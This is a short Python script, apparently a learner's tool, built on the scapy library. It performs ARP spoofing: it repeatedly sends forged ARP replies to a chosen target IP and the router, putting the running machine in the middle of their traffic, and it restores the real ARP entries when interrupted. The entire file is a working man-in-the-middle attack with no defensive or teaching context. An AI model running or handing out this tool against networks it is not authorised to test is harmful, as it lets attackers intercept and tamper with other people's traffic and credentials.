
from tabnanny import verbose
import scapy.all as scapy
import optparse
import time
def option():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Enter target ip address")
    parser.add_option("-r","--roterip",dest="roter_ip",help="Enter roter ip address")
    user_input = parser.parse_args()[0]
    if not user_input.target_ip:
        print("Enter target ip address")
    if not user_input.roter_ip:
        print("Enter roter ip address")
    return user_input

def ip_mac(ip_address):
    arp_request=scapy.ARP(pdst=ip_address)
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet=broadcast_packet/arp_request
    answered=scapy.srp(combined_packet,timeout=1,verbose=0)[0]
    return answered[0][1].hwsrc
    

def arp_poisoning(target_ip,modem_ip):
    target_mac=ip_mac(target_ip)
    arp_response=scapy.ARP(op = 2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip)
    #scapy.ls(scapy.ARP())
    scapy.send(arp_response,verbose=0)
def arp_poisoning_reset(ip_1,ip_2):
    mac_1=ip_mac(ip_1)
    mac_2=ip_mac(ip_2)
    arp_response=scapy.ARP(op = 2,pdst=ip_1,hwdst=mac_1,psrc=ip_2,hwsrc=mac_2)
    #scapy.ls(scapy.ARP())
    scapy.send(arp_response,verbose=0,count=5)

user_ip_address = option()
sending_packet=2
try:
    while True:
        sending_packet+=2
        def arp_function():
             
            arp_poisoning(user_ip_address.target_ip,user_ip_address.roter_ip)
            arp_poisoning(user_ip_address.roter_ip,user_ip_address.target_ip)
            time.sleep(3)
            print("\rstarted: ",end=f"{sending_packet}")
        arp_function()
except KeyboardInterrupt:
    print("\nQuit & Reset")
    arp_poisoning_reset(user_ip_address.target_ip,user_ip_address.roter_ip)
    arp_poisoning_reset(user_ip_address.roter_ip,user_ip_address.target_ip)
except IndexError:
    verbose=False
    arp_function()

